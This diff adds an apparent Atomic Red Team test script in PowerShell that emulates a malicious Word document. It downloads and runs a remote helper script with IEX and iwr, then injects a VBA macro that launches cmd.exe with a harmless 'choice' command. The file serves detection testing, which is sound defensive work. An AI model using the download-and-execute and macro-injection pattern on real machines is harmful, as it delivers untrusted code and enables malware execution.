@@ -1,0 +1,22 @@
+#TechniqueName: User Execution: Malicious Link
+#AtomicTestName: Maldoc choice flags command execution
+#Language: ps1
+
+#get_prereq_commands
+$msword = New-Object -ComObject word.application
+Stop-Process -Name WINWORD
+
+
+#prereq_commands
+If (Test-Path HKCU:SOFTWARE\Microsoft\Office\16.0) { exit 0 } else { exit 1 }
+
+
+#commands
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+$macrocode = "  a = Shell(`"cmd.exe /c choice /C Y /N /D Y /T 3`", vbNormalFocus)"
+Invoke-MalDoc $macrocode "16.0" "Word"
+
+
+#cleanup_commands
+Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\16.0\Word\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
+
